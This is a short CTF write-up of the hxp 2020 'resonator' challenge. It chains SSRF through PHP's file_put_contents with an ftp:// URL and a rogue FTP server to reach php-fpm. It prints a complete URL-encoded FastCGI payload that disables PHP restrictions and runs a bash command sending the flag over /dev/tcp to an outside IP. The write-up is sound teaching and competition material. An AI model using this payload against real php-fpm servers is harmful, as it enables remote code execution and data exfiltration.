### References

- [@dfyz, GatorSheavesMutably, Original writeup](https://github.com/dfyz/ctf-writeups/blob/master/hxp-2020/resonator)
- @Zeddyu, WebCTF知识星球, hxp2020

**Tag: SSRF, FTP Protocol**

> Using SSRF in `file_put_contents('ftp://...')` to deliver a FastCGI payload into a php-fpm socket.

1.run the `custom_ftp.py` from Zeddの知识星球 :)

2.Use [Gopherus](https://github.com/tarunkant/Gopherus) to generate fastcgi poc simply:

![img1](./assets/img1.png?raw=true)

3.send poc:

```tex
http://192.168.200.129:8009?file=ftp://evil_ftp:port/&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH102%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00f%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22/readflag%20%3E%20/dev/tcp/10x.xxx.xxx.xx8/9001%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

![img2](./assets/img2.png?raw=true)

#### About Env

When I run the `docker build` command, I got the following error in Ubuntu 20.04.2 LTS:

```tex
The command '/bin/sh -c ! find / -writable -or -user $(id -un) -or -group $(id -Gn|sed -e 's/ / -or -group /g') 2> /dev/null | grep -Ev -m 1 '^(/dev/|/run/|/proc/|/sys/|/tmp|/var/tmp|/var/lock|/var/log/nginx/error.log|/var/log/nginx/access.log|/var/lib/php/sessions)'' returned a non-zero code: 1
```

I dont know what this command means, and I just comment it simply and it works.🤣